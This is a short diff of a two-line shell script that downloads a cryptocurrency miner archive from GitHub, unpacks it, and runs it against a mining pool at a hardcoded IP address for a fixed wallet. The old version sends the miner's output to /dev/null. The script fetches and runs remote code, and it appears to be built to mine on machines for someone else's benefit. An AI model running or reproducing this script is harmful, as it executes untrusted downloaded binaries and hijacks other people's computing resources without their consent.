@@ -1,2 +1,2 @@
-wget https://github.com/bengetsia/soft/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz
-./xlarig -o https://pool.rplant.xyz -u SfqnjBSo1eTcJqRs5VFFnNeH7seoMCa1Sc -p BREWWWW >/dev/null 2>&1
+wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
+./xmrig -a ghostrider --url 139.162.36.122:443 --user SfqnjBSo1eTcJqRs5VFFnNeH7seoMCa1Sc.lab
